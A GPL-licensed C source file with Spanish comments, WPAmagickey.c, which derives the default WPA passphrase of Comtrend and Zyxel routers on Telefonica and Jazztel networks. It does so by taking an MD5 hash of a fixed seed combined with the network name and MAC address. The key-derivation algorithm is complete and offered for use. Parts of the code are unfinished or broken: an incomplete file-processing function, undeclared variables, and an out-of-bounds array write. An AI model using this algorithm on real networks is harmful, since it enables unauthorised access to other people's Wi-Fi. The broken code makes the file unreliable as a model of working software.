/*******************************************************************************
* Fichero:	WPAmagickey.c
* Autor:	www.seguridadwireless.net
* Algoritmo:	Dudux && Mambostar
* Coder:	Niroz&Me|on
* Fecha:	25-11-2010
* 
*
* 
* Descripcion:	Calcula la contraseña WiFi por defecto de una red WLAN_XXXX o 
*		Jaxxtell_XXXX (WPA). Routers Comtrend (Telefonik & JazzTel) y Zyxel.
*
* 
* Reutilizando codigo de wlandecrypter v1.3.x
* 
* 
* Este programa es software libre; puedes redistribuirlo y/o modificarlo
* bajo los terminos de la Licencia Publica General GNU (GPL) publicada
* por la Free Software Foundation en su version numero 2.
* Mira http://www.fsf.org/copyleft/gpl.txt.
*
* Lo anterior quiere decir que si modificas y/o redistribuyes este codigo o 
* partes del mismo debes hacerlo bajo las mismas condiciones anteriores, 
* incluyendo el codigo fuente modificado y citando a los autores originales.
* 
* Este programa se distribuye SIN GARANTIA de ningun tipo. USALO BAJO TU PROPIO
* RIESGO.
*
* 
* Mas informacion en foro.seguridadwireless.net
*
* v0.0.1: Primera versión de prueba
* v0.0.2: Añade essid Jazztel (25/11/2010)
* v0.1.0: Añade opcion para Essid cambiado (27/11/2010)
* v0.2.0: Añade router Zyxel (15/12/2010)
*******************************************************************************/

//#include <ctype.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>

#define VERSION 0
#define SUBVERSION 2
#define RELEASE 0
#define DATEVERSION "2010/12/15"

//--------------------------
// Estructuras de datos
//--------------------------

typedef struct{
	int orden;
	char* BSSID;
	char* ESSID;
	char* clave;
	char* date;
	
	
}ESTRUCTURA;




//---------------------------
// Variables globales
//---------------------------

FILE *fichero;

char SW[35]="[http://www.seguridadwireless.net]\0";
char appName[12]="WPAmagickey\0";

//------------------------------------------------------------------------------
// Funcion: salirError
// Centraliza mensajes de error y realiza salida controlada
//   Acentos eliminados intencionadamente para no tener
//   que gestionar codificación UTF-8 o ISO-8859-1
//------------------------------------------------------------------------------
void salirError (int errnum, ...)
{
	char *errmsg[8];
	
	// Obtene los posibles argumentos opcionales de la función
	va_list puntero;
	va_start(puntero, errnum);
	char *fname = va_arg(puntero, char*);
	va_end(puntero);
	
	errmsg[0] = "Numero de parámetros no válido";
	errmsg[1] = "Opcion no reconocida";
	errmsg[2] = "ESSID no especificado";
	errmsg[3] = "ESSID inválido: Se espera WLAN_XXXX, Jazztel_XXXX o NoEssid";
	errmsg[4] = "BSSID no especificado";
	errmsg[5] = "BSSID inválido: Se espera formato XX:XX:XX:XX:XX:XX";
	errmsg[6] = "Falta el parámetro correspondiente al fichero";
	errmsg[7] = "Error al abrir o crear el fichero";
	errmsg[8] = ("Imposible abrir el fichero %s", fname); 

	if (fichero != NULL)
	{ 
		fclose(fichero);
	}	

	//---fprintf(stderr,"\t\e[41m\e[37m[-Error]\033[0m %s\n\n",errmsg[errnum]);
	fprintf(stderr,"\t\e[41m\e[1;37m[-Error]\e[0m %s\n\n",errmsg[errnum]);
	exit(errnum);

}

//------------------------------------------------------------------------------
// Funcion: muestraVersion
// Muestra la versión del programa
//------------------------------------------------------------------------------
void muestraVersion(void)
{
//---fprintf(stdout, "\n\t\e[1;40m%s\e[0m v%i.%i.%i (%s) %s\n\n",appName,VERSION,SUBVERSION,RELEASE,DATEVERSION,SW);
 printf("\n\t\e[4;40m%s\e[0m v%i.%i.%i (%s) %s\n\n",appName,VERSION,SUBVERSION,RELEASE,DATEVERSION,SW);
}

//------------------------------------------------------------------------------
// Funcion: muestraUso
// Muestra las opciones de uso del programa
//------------------------------------------------------------------------------
void muestraUso(void)
{
	/*---
	fprintf(stdout, "\tAlgoritmo Dudu@seguridadwireless.net && Mambostar. Coder: NirozMe|on\n\n");
	fprintf(stdout, "\tUso: WPAmagickey <ESSID> <BSSID> [fichero]\n\n");
	fprintf(stdout, "\t<ESSID> = NOESSID para ESSID cambiado\n\n");
	fprintf(stdout, "\tEjemplo: wpamagickey wlan_XXXX XX:XX:XX:XX:XX:XX\n");
	fprintf(stdout, "\tEjemplo: wpamagickey jazztel_1234 aa:bb:cc:dd:ee:ff diccionario\n\n");
	*/
	
	printf("\tAlgoritmo por: Dudu@seguridadwireless.net && Mambostar. Coder: NirozMe|on\n\n"
		"\tUso: WPAmagickey <ESSID> <BSSID> [fichero]\n\n"
		"\t<ESSID> = NOESSID para ESSID cambiado\n\n"
		"\tEjemplo: wpamagickey wlan_XXXX XX:XX:XX:XX:XX:XX\n"
		"\tEjemplo: wpamagickey jazztel_1234 aa:bb:cc:dd:ee:ff diccionario\n\n");
}

void muestraAyuda(void)
{
	printf("\e[1;40mOPCIONES\e[0m\n"
		"\t-h, --help\n\t\tMuestra este manual de ayuda y termina\n"
		"\t-f \e[4;40mfile\e[0m, --file=FILE\n\t\tPermite pasar como argumento un fichero con múliples objetivos\n\t\tEjemplo: wpamagickey -f objetivos.txt\n"
		"\t\tEl formato del fichero con los objetivos tiene que ser:\n\t\t"
		"\t\t:\n");

}




//------------------------------------------------------------------------------
// Función: compruebaEssid
// Comprueba que el ESSID concuerde con patron WLAN_XXXX, Jazztel_XXXX o NoEssid
//------------------------------------------------------------------------------
void compruebaEssid (char *essid)
{
	unsigned int i;
	
	if (strlen(essid) != 9 & strlen(essid) != 12 & strlen(essid) != 7) 
	{
		salirError(3);
	}
	
	for (i=0;i<strlen(essid);i++)
	{
		essid[i]=toupper(essid[i]);
	}
	/*
	if (strlen(essid) == 9 & strncmp("WLAN_", essid, 5) != 0)
	{
		salirError(3);
	}
	
	if (strlen(essid) == 12 & strncmp("JAZZTEL_", essid, 8) != 0)
	{
		salirError(3);
	}
	
	if (strlen(essid) == 7 & strncmp("NOESSID", essid, 7) != 0) 
	{
		salirError(3);
	}
*/

	if (strlen(essid) == 9 & strncmp("WLAN_", essid, 5) != 0 || 
		strlen(essid) == 12 & strncmp("JAZZTEL_", essid, 8) != 0 ||
		strlen(essid) == 7 & strncmp("NOESSID", essid, 7) != 0)
	{
			salirError(3);	
	}



	if (strncmp("W", essid, 1) == 0)	
	{
		i = 5;
	}
	
	if (strncmp("J", essid, 1) == 0)
	{
		i = 8;
	}
	
	if (strncmp("NOESSID", essid, 7) != 0)
	{
 		for (i;i<strlen(essid);i++)
		{	
			if (!isxdigit(essid[i]))
			{
				salirError(3);
			}
		}
  	}
}

//------------------------------------------------------------------------------
// Función: compruebaBssid
// Comprueba que el BSSID concuerde con patron XX:XX:XX:XX:XX:XX
//------------------------------------------------------------------------------
void compruebaBssid (char *bssid)
{
	unsigned int i = 0;
	/*
	if (strlen(bssid) != 17)
	{ 
		salirError(5);
	}
	
	for (i=0;i<strlen(bssid);i++)
	{
		bssid[i] = toupper(bssid[i]);
	}
 
	for (i=0;i<5;i++)
	{
		if (bssid[i*3+2] != ':')
		{
			salirError(5);
		}
	}

	for (i=0;i<6;i++)
	{
		if (!isxdigit(bssid[i*3]) || !isxdigit(bssid[i*3+1]))
		{
			salirError(5);
		}
	}
	*/
	
	if(strlen(bssid) == 17)
	{
	
		while (i < strlen(bssid))
		{
			bssid[i] = toupper(bssid[i]);
			i++;
		}
	
		for (i = 0; i < 5; i++)
		{
			if (bssid[i*3+2] != ':')
			{
				salirError(5);
			}
		}

		for (i = 0; i < 6; i++)
		{
			if (!isxdigit(bssid[i*3]) || !isxdigit(bssid[i*3+1]))
			{
				salirError(5);
			}
		}
		
	}
	else
	{
		salirError(5);
	}
}

//------------------------------------------------------------------------------
// Funcion: calculaHash
// Calcula Hash MD5 del que se obtiene la clave WiFi
//------------------------------------------------------------------------------
unsigned char *calculaHash(char *algoritmo, char *buffer, unsigned int len, int *outlen)
{
	EVP_MD *m;
	EVP_MD_CTX ctx;
	
	unsigned char *hash;
	
	OpenSSL_add_all_digests ();
	
	if (!(m = (EVP_MD*) EVP_get_digestbyname(algoritmo)))
	{
		return NULL;
	}
	
	if (!(hash = (unsigned char *) malloc(EVP_MAX_MD_SIZE)))
	{
		return NULL;
	}
	
	EVP_DigestInit(&ctx, m);
	EVP_DigestUpdate(&ctx, buffer, len);
	EVP_DigestFinal(&ctx, hash, outlen);
	
 return hash;
}

//------------------------------------------------------------------------------
// Funcion: montaSemilla
// Prepara cadena a la que calcular el Hash MD5 para obtener la clave
//------------------------------------------------------------------------------
void montaSemilla (char *semilla, char *essid, char *bssid, int resta, int zyxel)
{
	char bssid1[13], bssid2[13];
	int i, j = 0;

	char noessid[5]="0000\0";
	long int x;	
	
	bssid1[12]='\0';
	bssid2[12]='\0';
	
	for (i=0;i<6;i++)	// elimina los : de la bssid
	{	
		bssid2[j]   = bssid[i*3];
		bssid2[j+1] = bssid[i*3+1];
		j = j + 2;
	}	

	strcpy(bssid1,bssid2);

	if (strncmp("NOESSID", essid, 7) == 0)
	{
		for (i=8;i<12;i++)	noessid[i-8]=bssid1[i];	// copia ultimas 4 cifras mac

		x = strtol(noessid,NULL,16);

		//---x = x-resta;
		x -= resta;

		sprintf (noessid, "%04X",(unsigned int)x);

		for (i=2;i<4;i++)	bssid1[i+8]=noessid[i];	// 2 ultimas cifras mac
	}
	else 
	{
		if (strncmp("W", essid, 1) == 0)	
		{
			i=5;
			for (i;i<strlen(essid);i++)	bssid1[i+3]=essid[i];
		}
		
		if (strncmp("J", essid, 1) == 0)	
		{
			i=8;
			for (i;i<strlen(essid);i++)	bssid1[i]=essid[i];
		}
	}

	if (!zyxel) {
		strcat(semilla,bssid1);
		strcat(semilla,bssid2);
	}
	else 
	{
		semilla[0]='\0';
		for (i=0;i<strlen(bssid1);i++) bssid1[i]=tolower(bssid1[i]);
		strcat(semilla,bssid1);
	}
}

//------------------------------------------------------------------------------
// Funcion: macZyxel
// Devuelve 1 si la mac (bssid) es de un router Zyxel valido, 0 si no lo es.
//------------------------------------------------------------------------------
int macZyxel(char *bssid)
{
	if (strncmp("00:1F:A4", bssid, 8) == 0)
	{ 
		return 1;
	}
	else
	{
		return 0;
	}
}

//------------------------------------------------------------------------------
// Funcion: muestraPass
// Escribe la clave en pantalla y/o fichero
//------------------------------------------------------------------------------
void muestraPass(unsigned char *buff, FILE *fichero, int zyxel)
{
	int i;

	if (!zyxel)
	{
		for(i=0;i<10;i++)
		{
			fprintf(fichero,"%02x",(unsigned char)(buff[i]&0xFF));
		}
	}
	else
	{
		for(i=0;i<10;i++)
		{
			fprintf(fichero,"%02X",(unsigned char)(buff[i]&0xFF));
		}
	}
	
	fprintf(fichero,"\n\n");
}

//------------------------------------------------------------------------------
// Funcion: procesaFichero
// Interpreta el fichero de objetivos y lee cada línea
//------------------------------------------------------------------------------

void procesaFichero(FILE *stream)
{
	
	if((stream = fopen()) == NULL)
	{
		errmsg(7); 
	}
	else
	{	
		while(!feof(obj))
		{
			fscanf(stream,"%d\t%s\t", );
		}
	}
	
}






//------------------------------------------------------------------------------
// Programa principal
//------------------------------------------------------------------------------
int main(int argc, char *argv[])
{
	char magicdudux[33]="bcgbghgg\0";
	
	int outlen, resta = 0, zyxel = 0;
	char *clave;


	muestraVersion();

	// Determina el número de caracteres
	
	switch(argc){
		
		case 2:
		
			if(strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0){
				
				muestraAyuda();
				return 0;
			}
		
			if(strcmp(argv[1], "-f") == 0 && argv[2] == NULL)
			{
		
				salirError(6);
			
			}
			
		break;
		
		case 3:
			
			if(strcmp(argv[1], "-f") == 0 && argv[2] != NULL)
			{			
				FILE *pf = fopen(argv[2], "r");
				if(pf == NULL )
				{
					//Poner donde los errores
				//	salirError(-1);
				//	fprintf(stdout,"\tNo se pudo abrir el fichero %s\n", argv[2]);
					salirError(8, argv[2]);
				
				//	return 0;
				}
				else {
					puts("fichero ok");
					return 0;
				}
				
			}
			else{
				salirError(6);					
			}
				
		break;
			
			
			
		default:
			muestraUso();
			salirError(0);
		//	return 0;
	}
	



	/*
	if (argc < 2 || argc > 4)
	{
		muestraUso();
		salirError(0);
		return 0;
	}
	*/
	compruebaEssid (argv[1]);
	compruebaBssid (argv[2]);

	fprintf(stdout,"Essid: %s - Bssid: %s \n\n", argv[1], argv[2]);

	zyxel = macZyxel(argv[2]);

	montaSemilla(magicdudux, argv[1], argv[2], resta, zyxel);

	if (argc == 4)
	{
		fichero = fopen(argv[3],"w");
		if (fichero == NULL) salirError(7);
		fprintf(stdout,"[+] Generando fichero de clave: %s\n\n", argv[3]);
		fprintf(fichero,"\n%s v%i.%i.%i %s\n\n",appName,VERSION,SUBVERSION,RELEASE,SW);
		fprintf(fichero,"Essid: %s - Bssid: %s \n\n", argv[1], argv[2]);

		if (strncmp("NOESSID", argv[1], 7) == 0)
		{
		   for (resta=1;resta<4;resta=resta+2)
		   {	
			magicdudux[8]='\0';
			montaSemilla(magicdudux, argv[1], argv[2], resta, zyxel);
			clave = calculaHash("md5", magicdudux, strlen(magicdudux), &outlen);
			muestraPass(clave,fichero,zyxel);
			fprintf(stdout," Clave: ");
			muestraPass(clave,stdout,zyxel);
		   }
		}
		else{
			clave = calculaHash("md5", magicdudux, strlen(magicdudux), &outlen);
			muestraPass(clave,fichero,zyxel);
			fprintf(stdout," Clave: ");
			muestraPass(clave,stdout,zyxel);
		}
	
		fclose(fichero);
		fprintf(stdout,"[+] Fichero guardado OK\n\n");
	}
	else
	{
		if (strncmp("NOESSID", argv[1], 7) == 0)
		{
		   for (resta=1;resta<4;resta=resta+2)
		   {	
			magicdudux[8]='\0';
			montaSemilla(magicdudux, argv[1], argv[2], resta, zyxel);
			clave = calculaHash("md5", magicdudux, strlen(magicdudux), &outlen);
			fprintf(stdout," Clave: ");
			muestraPass(clave,stdout,zyxel);
		   }
		}
		else{
			clave = calculaHash("md5", magicdudux, strlen(magicdudux), &outlen);
			fprintf(stdout," Clave: ");
			muestraPass(clave,stdout,zyxel);
		}
	}

 	return 0;
}
//------------------------------------------------------------------------------ EOF
